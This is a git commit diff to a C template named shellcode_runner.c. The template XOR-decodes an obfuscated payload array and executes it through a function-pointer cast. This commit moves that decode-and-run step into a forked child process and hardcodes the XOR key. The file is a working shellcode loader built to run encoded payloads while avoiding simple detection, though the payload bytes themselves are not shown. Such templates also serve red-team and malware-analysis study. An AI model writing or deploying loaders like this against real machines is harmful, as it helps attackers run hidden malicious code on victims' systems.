11bd4d50bb5eb4d3d8e840ca7fc7d6e043a0903e
Hexadec <152536937+hex-a-dec@users.noreply.github.com>
2024-10-03 15:35:13 +0200

    Update shellcode_runner.c

--- template/c/shellcode_runner.c
+++ template/c/shellcode_runner.c
@@ -7,12 +7,14 @@
 
 int main (int argc, char **argv) 
 {
-	char xor_key = '<KEY>';
-	int arraysize = (int) sizeof(payload);
-	for (int i=0; i<arraysize-1; i++)
-	{
-		payload[i] = payload[i]^xor_key;
+	if (fork() == 0){
+		char xor_key = 'z';
+		int arraysize = (int) sizeof(payload);
+		for (int i=0; i<arraysize-1; i++)
+		{
+			payload[i] = payload[i]^xor_key;
+		}
+		int (*ret)() = (int(*)())payload;
+		ret();
 	}
-	int (*ret)() = (int(*)())payload;
-	ret();
 }
